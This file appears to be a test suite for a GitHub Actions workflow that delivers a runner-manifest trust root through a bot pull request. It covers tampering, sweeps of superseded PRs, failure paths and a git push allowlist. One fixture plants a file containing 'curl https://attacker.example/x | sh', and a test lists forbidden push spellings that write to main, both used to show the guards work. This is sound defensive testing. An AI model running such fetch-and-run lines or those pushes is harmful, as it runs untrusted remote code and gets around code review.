test('content pushed onto the manifest branch by anyone else never reaches the PR', () => {
  // The branch is workflow-owned and unprotected: the delivery path must rebuild
  // its content from main rather than carry whatever the branch happens to hold
  // into a PR a maintainer approves as a routine bot manifest update.
  const fixture = createFixture({
    releaseAssets: completeRelease(),
    manifestBranchFiles: {
      'evil.sh': 'curl https://attacker.example/x | sh\n',
      'README.md': 'tampered repository content\n',
    },
  });
  try {
    const tampered = originRef(fixture, BRANCH);
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
    assert.equal(run.outputs.branch.existed, 'false', 'the tampered branch must be discarded');

    const head = originRef(fixture, BRANCH);
    const main = originRef(fixture, 'main');
    const show = (ref: string, path: string) =>
      git(fixture.root, '--git-dir', fixture.origin, 'show', `${ref}:${path}`);

    assert.deepEqual(
      git(
        fixture.root,
        '--git-dir',
        fixture.origin,
        'diff',
        '--name-only',
        String(main),
        String(head),
      )
        .trim()
        .split('\n')
        .sort(),
      [
        'packages/claude-plugin/runner-manifest.json',
        'packages/codex-plugin/runner-manifest.json',
        'runner-manifest.json',
      ],
      'the PR may differ from main in the trust root and nothing else',
    );
    assert.equal(show(String(head), 'README.md'), show(String(main), 'README.md'));
    assert.throws(() => show(String(head), 'evil.sh'), 'the smuggled file must be gone');
    // The replacement is cut from main, so the tampered commit is not in its
    // history at all — and it got there by deleting the branch and pushing a new
    // one, never by force-updating a ref.
    assert.throws(
      () =>
        git(
          fixture.root,
          '--git-dir',
          fixture.origin,
          'merge-base',
          '--is-ancestor',
          String(tampered),
          String(head),
        ),
      'the tampered commit must not survive in the branch history',
    );
    assert.equal(
      git(fixture.root, '--git-dir', fixture.origin, 'rev-parse', `${String(head)}^`).trim(),
      String(main),
      'the replacement must be parented on current main, resetting the merge base',
    );
  } finally {
    fixture.cleanup();
  }
});

test('a rerun after the release manifest drifts re-commits onto the same branch', () => {
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const first = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(first.ok, `first run failed at ${first.failed?.name}: ${first.failed?.stderr}`);
    const headAfterFirst = originRef(fixture, BRANCH);

    // The runner zips were rebuilt, so the digests the manifest must carry change.
    writeFileSync(fixture.gh.assetPath(TAG, IOS_ZIP), 'rebuilt-ios-runner-zip-bytes');
    const second = runPublish(fixture, { workdir: checkout(fixture, 'run2') });
    assert.ok(second.ok, `rerun failed at ${second.failed?.name}: ${second.failed?.stderr}`);

    const head = originRef(fixture, BRANCH);
    assert.notEqual(head, headAfterFirst, 'a drifted digest must be re-committed');
    assert.equal(
      JSON.parse(
        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:runner-manifest.json`),
      ).assets.ios[0].sha256,
      sha256('rebuilt-ios-runner-zip-bytes'),
    );
    assert.equal(fixture.gh.state().prs.length, 1, 'still the same PR');
  } finally {
    fixture.cleanup();
  }
});

test('a manifest PR from an earlier version is closed before this one is armed', () => {
  const superseded = 'chore/runner-manifest-v0.76.6';
  // Enough unrelated open PRs that the superseded one falls past the first API
  // page: an unpaged sweep would miss it, and it must still be found and retired.
  const noise: GhPullRequest[] = Array.from({ length: 120 }, (_unused, i) => ({
    number: 100 + i,
    headRefName: `feature/unrelated-${i}`,
    baseRefName: 'main',
    state: 'OPEN',
    autoMerge: null,
    closeComment: null,
  }));
  const fixture = createFixture({
    releaseAssets: completeRelease(),
    supersededBranches: [superseded],
    prs: [
      ...noise,
      {
        number: 7,
        headRefName: superseded,
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: 'squash',
        closeComment: null,
      },
    ],
  });
  try {
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);

    const state = fixture.gh.state();
    const stale = state.prs.find((pr) => pr.number === 7);
    assert.equal(stale?.state, 'CLOSED', 'an armed superseded PR would land after this one');
    assert.match(String(stale?.closeComment), new RegExp(`Superseded .*v${VERSION}`));
    assert.equal(originRef(fixture, superseded), null, 'its branch must be deleted too');

    const current = state.prs.find((pr) => pr.headRefName === BRANCH);
    assert.equal(current?.state, 'OPEN', 'the sweep must never close the PR it just opened');
    assert.equal(current?.autoMerge, 'squash');

    const calls = ghCalls(fixture);
    const closeAt = calls.findIndex((c) => c.startsWith('pr close'));
    const mergeAt = calls.findIndex((c) => c.startsWith('pr merge'));
    assert.ok(closeAt !== -1 && mergeAt !== -1);
    assert.ok(closeAt < mergeAt, 'the superseded PR must be retired BEFORE this one is armed');
    assert.equal(calls.filter((c) => c.startsWith('pr close')).length, 1);
  } finally {
    fixture.cleanup();
  }
});

test('a failed pull-request listing aborts instead of sweeping nothing', () => {
  // The sweep is a pipeline, and the runner's default shell has no pipefail, so
  // a failing listing would otherwise yield an empty STALE, close nothing, and
  // still arm this PR — leaving an armed PR from an earlier version free to land
  // afterwards and restore a stale trust root.
  const superseded = 'chore/runner-manifest-v0.76.6';
  const fixture = createFixture({
    releaseAssets: completeRelease(),
    supersededBranches: [superseded],
    prs: [
      {
        number: 7,
        headRefName: superseded,
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: 'squash',
        closeComment: null,
      },
    ],
  });
  try {
    const run = runPublish(fixture, {
      workdir: checkout(fixture, 'run1'),
      env: { GH_STUB_FAIL: 'api repos' },
    });
    assert.equal(run.ok, false, 'a swept-nothing run must not report success');
    assert.equal(run.failed?.name, 'Open or reuse the manifest PR and arm auto-merge');
    const calls = ghCalls(fixture);
    assert.equal(
      calls.some((c) => c.startsWith('pr merge')),
      false,
      'auto-merge must not be armed while a superseded PR may still be open',
    );
    assert.equal(fixture.gh.state().prs.find((pr) => pr.number === 7)?.state, 'OPEN');
  } finally {
    fixture.cleanup();
  }
});

test('a superseded PR that cannot be closed aborts the job before arming auto-merge', () => {
  const superseded = 'chore/runner-manifest-v0.76.6';
  const fixture = createFixture({
    releaseAssets: completeRelease(),
    supersededBranches: [superseded],
    prs: [
      {
        number: 7,
        headRefName: superseded,
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: 'squash',
        closeComment: null,
      },
    ],
  });
  try {
    const run = runPublish(fixture, {
      workdir: checkout(fixture, 'run1'),
      env: { GH_STUB_FAIL: 'pr close' },
    });
    assert.equal(run.ok, false, 'a swallowed close would let the stale PR land afterwards');
    assert.equal(run.failed?.name, 'Open or reuse the manifest PR and arm auto-merge');

    const calls = ghCalls(fixture);
    assert.ok(
      calls.some((c) => c.startsWith('pr close')),
      'it must have tried to close',
    );
    assert.equal(
      calls.some((c) => c.startsWith('pr merge')),
      false,
      'auto-merge must not be armed while a superseded PR is still open',
    );
    // The sweep precedes PR creation, so this version's PR is not merely
    // unarmed — it was never opened while a superseded one may still land.
    assert.equal(
      fixture.gh.state().prs.some((pr) => pr.headRefName === BRANCH),
      false,
    );
  } finally {
    fixture.cleanup();
  }
});

test('failing to arm auto-merge fails the job instead of leaving the trust root stale', () => {
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const run = runPublish(fixture, {
      workdir: checkout(fixture, 'run1'),
      env: { GH_STUB_FAIL: 'pr merge' },
    });
    assert.equal(
      run.ok,
      false,
      'a silent arming failure is how the manifest rotted for nine releases',
    );
    assert.match(run.failed?.stderr ?? '', /::error::could not arm auto-merge/);
  } finally {
    fixture.cleanup();
  }
});

test('a failed remote query fails the job instead of reading as "nothing to deliver"', () => {
  const fixture = createFixture({ releaseAssets: completeRelease() });
  try {
    const workdir = checkout(fixture, 'run1');
    // Transport failure, not a missing ref: git exits 128 here, and 128 must
    // never be mistaken for "the branch does not exist".
    git(workdir, 'remote', 'set-url', 'origin', join(fixture.root, 'vanished.git'));
    const run = runPublish(fixture, { workdir });

    assert.equal(run.ok, false, 'a green run here leaves the trust root undelivered');
    assert.equal(run.failed?.name, 'Reuse or recreate the version-keyed manifest branch');
    assert.match(run.failed?.stderr ?? '', /::error::could not ask origin whether/);
    assert.equal(
      ghCalls(fixture).some((c) => c.startsWith('pr ')),
      false,
      'no PR work may happen once the branch state is unknown',
    );
  } finally {
    fixture.cleanup();
  }
});

test('an already-current trust root with no manifest branch opens no PR', () => {
  const fixture = createFixture({
    repoManifest: currentManifest(),
    releaseAssets: completeRelease(),
  });
  try {
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
    assert.equal(run.outputs.branch.existed, 'false');
    assert.equal(run.outputs.commit.pushed, 'false', 'an unchanged manifest must not commit');
    assert.equal(originRef(fixture, BRANCH), null);
    assert.equal(fixture.gh.state().prs.length, 0, 'nothing to deliver means no PR');
    assert.match(run.steps.at(-1)?.stdout ?? '', new RegExp(`already carries v${VERSION}`));
  } finally {
    fixture.cleanup();
  }
});

test('a superseded PR is retired even when this run has nothing of its own to deliver', () => {
  // Reachable whenever the trust root reached main by some other route (a
  // maintainer's own PR) while the release still lacks its manifest asset:
  // detect says publish, this job re-uploads the asset, and finds no branch and
  // nothing to commit. Returning there would leave an armed PR from an earlier
  // version free to land afterwards and rewrite main's trust root backwards.
  const superseded = 'chore/runner-manifest-v0.76.6';
  const fixture = createFixture({
    repoManifest: currentManifest(),
    releaseAssets: completeRelease(),
    supersededBranches: [superseded],
    prs: [
      {
        number: 7,
        headRefName: superseded,
        baseRefName: 'main',
        state: 'OPEN',
        autoMerge: 'squash',
        closeComment: null,
      },
    ],
  });
  try {
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.ok(run.ok, `job failed at ${run.failed?.name}: ${run.failed?.stderr}`);
    assert.equal(run.outputs.commit.pushed, 'false', 'this run has nothing of its own to deliver');

    const state = fixture.gh.state();
    assert.equal(
      state.prs.find((pr) => pr.number === 7)?.state,
      'CLOSED',
      'an armed PR from an earlier version must not survive a run with nothing to deliver',
    );
    assert.equal(originRef(fixture, superseded), null, 'its branch must be deleted too');
    assert.equal(
      state.prs.some((pr) => pr.headRefName === BRANCH),
      false,
      'nothing to deliver still means no PR of its own',
    );
    assert.equal(originRef(fixture, BRANCH), null);
  } finally {
    fixture.cleanup();
  }
});

test('the publish job refuses a trust root the installed plugin cannot use', () => {
  const fixture = createFixture({ pluginVersion: '0.76.8', releaseAssets: completeRelease() });
  try {
    const run = runPublish(fixture, { workdir: checkout(fixture, 'run1') });
    assert.equal(
      run.ok,
      false,
      'a v0.76.7 manifest would send every v0.76.8 client to a local build',
    );
    assert.equal(
      run.failed?.name,
      'Refuse to deliver a trust root the installed plugin cannot use',
    );
    assert.match(run.failed?.stderr ?? '', /refusing to publish a v0\.76\.7 trust root/);

    assert.equal(originRef(fixture, BRANCH), null, 'nothing may be pushed after the refusal');
    assert.equal(fixture.gh.state().prs.length, 0);
    assert.equal(
      ghCalls(fixture).some((c) => c.startsWith('release upload')),
      false,
      'the release must not be rewritten either',
    );
  } finally {
    fixture.cleanup();
  }
});

test('detect reports a stale trust root even when the release is complete', () => {
  const fixture = createFixture({
    releaseAssets: { ...completeRelease(), 'runner-manifest.json': currentManifest() },
  });
  try {
    const run = runDetect(fixture);
    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
    assert.deepEqual(run.outputs.v, {
      version: VERSION,
      build: 'false',
      publish: 'true',
      branch: BRANCH,
    });
  } finally {
    fixture.cleanup();
  }
});

test('detect stands down once the in-repo trust root matches the published manifest', () => {
  const current = currentManifest();
  const fixture = createFixture({
    repoManifest: current,
    releaseAssets: { ...completeRelease(), 'runner-manifest.json': current },
  });
  try {
    const run = runDetect(fixture);
    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
    assert.equal(run.outputs.v.publish, 'false');
    assert.equal(run.outputs.v.build, 'false');
  } finally {
    fixture.cleanup();
  }
});

test('detect rebuilds when a release zip no longer matches what it published', () => {
  // Both zips are present and the published manifest still equals the in-repo
  // one, so an asset-name gate reports the release fully published while it
  // serves an iOS zip no client can verify. Republishing would re-hash bytes
  // this workflow never built; the repair is to rebuild both from source.
  const current = currentManifest();
  const fixture = createFixture({
    repoManifest: current,
    releaseAssets: {
      ...completeRelease(),
      [IOS_ZIP]: 'ios-runner-zip-bytes-substituted-after-publication',
      'runner-manifest.json': current,
    },
  });
  try {
    const run = runDetect(fixture);
    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
    assert.equal(run.outputs.v.build, 'true', 'a drifted zip must never be adopted as-is');
    assert.equal(run.outputs.v.publish, 'true');
    assert.match(run.steps.at(-1)?.stdout ?? '', /this workflow did not publish/);
  } finally {
    fixture.cleanup();
  }
});

test('detect rebuilds a substituted zip while the trust root is still stale', () => {
  // The post-release delivery window: the manifest PR has not landed, so the
  // in-repo manifest describes an older version and names nothing on this
  // release. The manifest asset on the release does name these zips, and it is
  // what the workflow itself last published.
  const fixture = createFixture({
    releaseAssets: {
      ...completeRelease(),
      [IOS_ZIP]: 'ios-runner-zip-bytes-substituted-during-the-delivery-window',
      'runner-manifest.json': currentManifest(),
    },
  });
  try {
    const run = runDetect(fixture);
    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
    assert.equal(
      run.outputs.v.build,
      'true',
      'a stale trust root must not make the substituted zip publishable',
    );
    assert.equal(run.outputs.v.publish, 'true');
    assert.match(run.steps.at(-1)?.stdout ?? '', /this workflow did not publish/);
  } finally {
    fixture.cleanup();
  }
});

test('detect treats a version with no release yet as unpublished', () => {
  const fixture = createFixture({});
  try {
    const run = runDetect(fixture);
    assert.ok(run.ok, `detect failed: ${run.failed?.stderr}`);
    assert.equal(run.outputs.v.build, 'true');
    assert.equal(run.outputs.v.publish, 'true');
  } finally {
    fixture.cleanup();
  }
});

test('detect refuses to read a failed release listing as an empty release', () => {
  // "No release yet" and "the API blipped" both used to yield an empty asset
  // list, which rebuilds zips the release already serves correctly — and since
  // neither Xcode nor Gradle is byte-reproducible, the replacements drift from
  // the trust root and send every install to a local build.
  const current = currentManifest();
  const fixture = createFixture({
    repoManifest: current,
    releaseAssets: { ...completeRelease(), 'runner-manifest.json': current },
  });
  try {
    const run = runJobSteps({
      workflow,
      jobId: 'detect',
      cwd: checkout(fixture, 'detect'),
      ctx: DETECT_CTX,
      env: { ...fixture.gh.env, GH_STUB_FAIL: 'release view' },
      only: ['Decide what this run must build and publish'],
    });
    assert.equal(run.ok, false, 'a blip must not be readable as "nothing is published"');
    assert.match(run.failed?.stderr ?? '', /::error::could not determine what release/);
    assert.deepEqual(run.outputs.v, {}, 'no build decision may escape an unknown release state');
  } finally {
    fixture.cleanup();
  }
});

test('detect creates the release for this version only when it is missing', () => {
  const fixture = createFixture({});
  try {
    const workdir = checkout(fixture, 'detect');
    const ctx = { 'secrets.GITHUB_TOKEN': 'stub-token', 'steps.v.outputs.version': VERSION };
    const only = ['Create the release for this version (idempotent)'];
    const first = runJobSteps({
      workflow,
      jobId: 'detect',
      cwd: workdir,
      ctx,
      env: fixture.gh.env,
      only,
    });
    assert.ok(first.ok, first.failed?.stderr);
    const second = runJobSteps({
      workflow,
      jobId: 'detect',
      cwd: workdir,
      ctx,
      env: fixture.gh.env,
      only,
    });
    assert.ok(second.ok, `a rerun must not fail on an existing release: ${second.failed?.stderr}`);
    assert.equal(
      ghCalls(fixture).filter((c) => c.startsWith('release create')).length,
      1,
      'the release must be created once, then reused',
    );
    assert.deepEqual(Object.keys(fixture.gh.state().releases), [TAG]);
  } finally {
    fixture.cleanup();
  }
});

for (const [jobId, asset, bytes] of [
  ['build-ios', IOS_ZIP, IOS_BYTES],
  ['build-android', ANDROID_ZIP, ANDROID_BYTES],
] as const) {
  test(`${jobId} uploads only its own asset, and a rerun replaces it`, () => {
    const fixture = createFixture({ releaseAssets: {} });
    try {
      const workdir = checkout(fixture, 'build');
      writeFileSync(join(workdir, asset), bytes);
      const ctx = {
        'needs.detect.outputs.version': VERSION,
        'secrets.GITHUB_TOKEN': 'stub-token',
      };
      const only = ['Upload to the release'];
      for (const attempt of [1, 2]) {
        const run = runJobSteps({ workflow, jobId, cwd: workdir, ctx, env: fixture.gh.env, only });
        assert.ok(run.ok, `attempt ${attempt} failed: ${run.failed?.stderr}`);
      }
      // Without --clobber the stub refuses the second upload, exactly as the
      // release API does, so this proves the rerun path is idempotent.
      assert.deepEqual(Object.keys(fixture.gh.state().releases[TAG].assets), [asset]);
      assert.equal(fixture.gh.state().releases[TAG].assets[asset].uploads, 2);
      assert.equal(readFileSync(fixture.gh.assetPath(TAG, asset), 'utf8'), bytes);
    } finally {
      fixture.cleanup();
    }
  });
}

test('the step runner honours working-directory and refuses fields it does not model', () => {
  // The harness claims to run steps the way the runner does, so a step field it
  // cannot reproduce has to fail loudly rather than be dropped — a later test
  // would otherwise pass or fail for the wrong reason.
  const root = mkdtempSync(join(tmpdir(), 'workflow-harness-'));
  try {
    mkdirSync(join(root, 'nested'));
    const harness = {
      jobs: {
        located: {
          steps: [{ name: 'touch', run: 'touch marker', 'working-directory': 'nested' }],
        },
        unmodelled: { steps: [{ name: 'lenient', run: ':', 'continue-on-error': true }] },
        pythonShell: { steps: [{ name: 'python', run: 'pass', shell: 'python' }] },
        defaultShell: { steps: [{ name: 'pipeline', run: 'false | true' }] },
        bashShell: { steps: [{ name: 'pipeline', run: 'false | true', shell: 'bash' }] },
      },
    } as unknown as Parameters<typeof runJobSteps>[0]['workflow'];

    const run = runJobSteps({ workflow: harness, jobId: 'located', cwd: root, ctx: {} });
    assert.ok(run.ok, run.failed?.stderr);
    assert.ok(existsSync(join(root, 'nested', 'marker')), 'the step must run in working-directory');
    assert.equal(existsSync(join(root, 'marker')), false);

    assert.throws(
      () => runJobSteps({ workflow: harness, jobId: 'unmodelled', cwd: root, ctx: {} }),
      /does not model: continue-on-error/,
    );
    assert.throws(
      () => runJobSteps({ workflow: harness, jobId: 'pythonShell', cwd: root, ctx: {} }),
      /shell the harness does not model: python/,
    );
    // The runner's default shell has no pipefail; only `shell: bash` sets it. The
    // harness must reproduce that, or a step relying on the stricter shell would
    // pass here and swallow a failing pipeline in production.
    assert.equal(
      runJobSteps({ workflow: harness, jobId: 'defaultShell', cwd: root, ctx: {} }).ok,
      true,
      'the default shell must not set pipefail',
    );
    assert.equal(
      runJobSteps({ workflow: harness, jobId: 'bashShell', cwd: root, ctx: {} }).ok,
      false,
      '`shell: bash` must set pipefail',
    );
  } finally {
    rmSync(root, { force: true, recursive: true });
  }
});

// --- structural contract (assertions the simulation cannot make) ---

// Allowlist, not blacklist: `git push origin HEAD` while checked out on main
// writes to the default branch just as surely as naming it, and a global option
// before the subcommand (`git -C . push ...`) must be rejected rather than
// silently skipped. Only two shapes are permitted — writing the manifest branch,
// and deleting a superseded one.
const PERMITTED_PUSHES = [
  ['git', 'push', 'origin', '$BRANCH'],
  ['git', 'push', 'origin', '--delete', '$BRANCH'],
  ['git', 'push', 'origin', '--delete', '$ref'],
];

// git's value-taking global options, so the subcommand is found rather than
// guessed: `git -C . push` is a push, `git commit -m "... push ..."` is not.
const GIT_GLOBAL_OPTIONS_WITH_VALUE = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--exec-path',
  '--super-prefix',
]);

function gitSubcommand(tokens: string[]): string | undefined {
  if (tokens[0] !== 'git') return undefined;
  for (let i = 1; i < tokens.length; i++) {
    if (!tokens[i].startsWith('-')) return tokens[i];
    if (GIT_GLOBAL_OPTIONS_WITH_VALUE.has(tokens[i])) i++;
  }
  return undefined;
}

function isGitPush(tokens: string[]): boolean {
  return gitSubcommand(tokens) === 'push';
}

function isPermittedPush(tokens: string[]): boolean {
  return PERMITTED_PUSHES.some((allowed) => JSON.stringify(tokens) === JSON.stringify(allowed));
}

// A command that carries a push the parser cannot attribute to git — `xargs …
// git push …`, `sh -c "git push …"`. Judged per COMMAND, never per line: a
// permitted push sharing the line must not vouch for the one beside it. A git
// command whose subcommand resolves (`git commit -m "… push …"`) is classified,
// so prose is not mistaken for a carrier.
function isUnrecognisedPushCarrier(tokens: string[]): boolean {
  return tokens.includes('push') && gitSubcommand(tokens) === undefined;
}

// Everything a default-branch write could hide behind: a recognised push the
// allowlist rejects, or a push the parser could not classify at all.
function refusedPushForms(script: string): string[][] {
  return shellCommands(script).filter(
    (tokens) =>
      isUnrecognisedPushCarrier(tokens) || (isGitPush(tokens) && !isPermittedPush(tokens)),
  );
}

test('every push targets the version-derived manifest branch, never a default-branch ref', () => {
  // The simulation proves what the delivery path DOES; this proves what no path
  // anywhere in the workflow may do — reach the default branch — including jobs
  // and branches the simulation never enters. Commands are compared as
  // normalised token arrays, so quoting or ${BRANCH} spelling does not matter.
  const pushes = everyStep().flatMap(({ jobId, step }) =>
    shellCommands(step.run ?? '')
      .filter(isGitPush)
      .map((tokens) => ({ jobId, tokens })),
  );
  assert.ok(pushes.length > 0, 'the manifest has to be pushed somewhere');
  for (const { jobId, tokens } of pushes) {
    assert.ok(isPermittedPush(tokens), `${jobId} pushes somewhere unexpected: ${tokens.join(' ')}`);
  }
  assert.ok(
    pushes.some(({ tokens }) => JSON.stringify(tokens) === JSON.stringify(PERMITTED_PUSHES[0])),
    'the manifest branch must be pushed',
  );
});

test('the push allowlist rejects default-branch writes however they are spelled', () => {
  // A guard that silently skips what it cannot parse is not a guard: each of
  // these must be SEEN as a push and REFUSED, not filtered out of the check.
  const forbidden = [
    'git push origin HEAD:main',
    'git push origin HEAD',
    'git push origin main',
    'git -C . push origin HEAD:main',
    'git -c user.name=x push origin main',
    'git --git-dir=.git push origin main',
    'git push --force origin "$BRANCH"',
    'git push origin "${BRANCH}:main"',
    'if [ -n "$x" ]; then git push origin HEAD:main; fi',
    'if git push origin main; then :; fi',
    'if ! git push origin HEAD:main; then :; fi',
    'while git push origin main; do :; done',
    'until git push origin HEAD:main; do :; done',
    'do git push origin main',
    'command git push origin main',
    'env GIT_DIR=.git git push origin main',
    'GIT_DIR=.git git push origin HEAD:main',
    '! git push origin HEAD:main',
    'out=$(git push origin HEAD:main)',
    'if ! out=$(git push origin HEAD:main); then :; fi',
    'eval "git push origin main"',
    'echo x | xargs -I{} git push origin HEAD:main',
    'git push origin "$BRANCH" && echo main | xargs -I{} git push origin HEAD:{}',
  ];
  for (const line of forbidden) {
    assert.ok(
      refusedPushForms(line).length > 0,
      `neither refused by the allowlist nor flagged as unclassifiable: ${line}`,
    );
  }
  for (const line of ['git push origin "$BRANCH"', 'then git push origin "${BRANCH}"']) {
    assert.deepEqual(refusedPushForms(line), [], `a required push was refused: ${line}`);
    assert.equal(shellCommands(line).filter(isGitPush).length, 1, `not recognised: ${line}`);
  }
  // Prose that merely says the word is neither a push nor an unclassifiable
  // carrier — the classifier resolves `git commit`, so it is not policed.
  for (const line of ['git commit -m "chore: push the trust root"', 'gh pr merge --auto 1']) {
    assert.deepEqual(refusedPushForms(line), [], `not a push, must not be policed: ${line}`);
    assert.deepEqual(shellCommands(line).filter(isGitPush), []);
  }
});

test('no command carries a push the allowlist cannot classify', () => {
  // The backstop for the guard above. Round after round, a push spelling the
  // parser could not see was silently EXEMPT from the allowlist rather than
  // refused. A guard that skips what it cannot parse is not a guard, so a
  // COMMAND that carries the word `push` without resolving to a git subcommand
  // fails here as unclassifiable. Judged per command, so a permitted push
  // elsewhere on the same line cannot vouch for it.
  const carriers = everyStep().flatMap(({ jobId, step }) =>
    shellCommands(step.run ?? '')
      .filter(isUnrecognisedPushCarrier)
      .map((tokens) => `${jobId}: ${tokens.join(' ')}`),
  );
  assert.deepEqual(
    carriers,
    [],
    'these carry a push the parser did not recognise — teach it the spelling, do not skip it',
  );
  // A push handed to another program is caught even when a permitted push shares
  // the line, which is precisely what a per-line check let through.
  assert.deepEqual(
    refusedPushForms('git push origin "$BRANCH" && echo main | xargs -I{} git push origin HEAD:{}'),
    [['xargs', '-I{}', 'git', 'push', 'origin', 'HEAD:{}']],
  );
  assert.deepEqual(refusedPushForms('git push origin "$BRANCH"'), []);
});

test('the publish job is permitted to open a pull request', () => {
  const permissions = workflow.jobs['publish-manifest'].permissions ?? {};
  assert.equal(permissions['pull-requests'], 'write');
  assert.equal(permissions.contents, 'write');
});

test('the manifest branch comes from the detect decision, not a literal', () => {
  const env = workflow.jobs['publish-manifest'].env ?? {};
  assert.equal(env.BRANCH, '${{ needs.detect.outputs.branch }}');
  assert.equal(env.VERSION, '${{ needs.detect.outputs.version }}');
});

test('every job builds and publishes from main, never from the dispatching ref', () => {
  const checkouts = everyStep().filter(({ step }) =>
    (step.uses ?? '').startsWith('actions/checkout'),
  );
  assert.equal(checkouts.length, 4, 'each job checks out once');
  for (const { jobId, step } of checkouts) {
    assert.equal(step.with?.ref, 'main', `${jobId} would publish from the dispatching ref`);
  }
});

test('publication is serialised repository-wide, not per triggering ref', () => {
  assert.equal(workflow.concurrency, 'runner-artifacts');
  assert.doesNotMatch(
    String(workflow.concurrency),
    /github\.ref/,
    'a dispatch from another ref would race the sweep over the same release and branch',
  );
});

test('publish still runs when both builds are skipped (the stale-manifest self-heal)', () => {
  const condition = (workflow.jobs['publish-manifest'].if ?? '').replace(/\s+/g, ' ');
  assert.match(condition, /needs\.detect\.outputs\.publish == 'true'/);
  // `contains(... 'skipped' ...)` must ADMIT a skipped build; merely mentioning
  // the word would also match a condition that rejects it.
  for (const job of ['build-ios', 'build-android']) {
    assert.match(
      condition,
      new RegExp(
        `contains\\(fromJSON\\('\\["success","skipped"\\]'\\), needs\\.${job}\\.result\\)`,
      ),
      `a complete release skips ${job} — publish must still run`,
    );
  }
  assert.doesNotMatch(
    condition,
    /!\s*contains\(/,
    'the skipped states must be admitted, not denied',
  );
  assert.deepEqual(workflow.jobs['publish-manifest'].needs, [
    'detect',
    'build-ios',
    'build-android',
  ]);
});

test('the build jobs are gated on the detect decision', () => {
  for (const jobId of ['build-ios', 'build-android']) {
    assert.equal(workflow.jobs[jobId].if, "needs.detect.outputs.build == 'true'");
    assert.deepEqual(workflow.jobs[jobId].needs, 'detect');
  }
  assert.equal(
    steps('detect').find((s) => s.name?.startsWith('Create the release'))?.if,
    "steps.v.outputs.build == 'true'",
  );
});
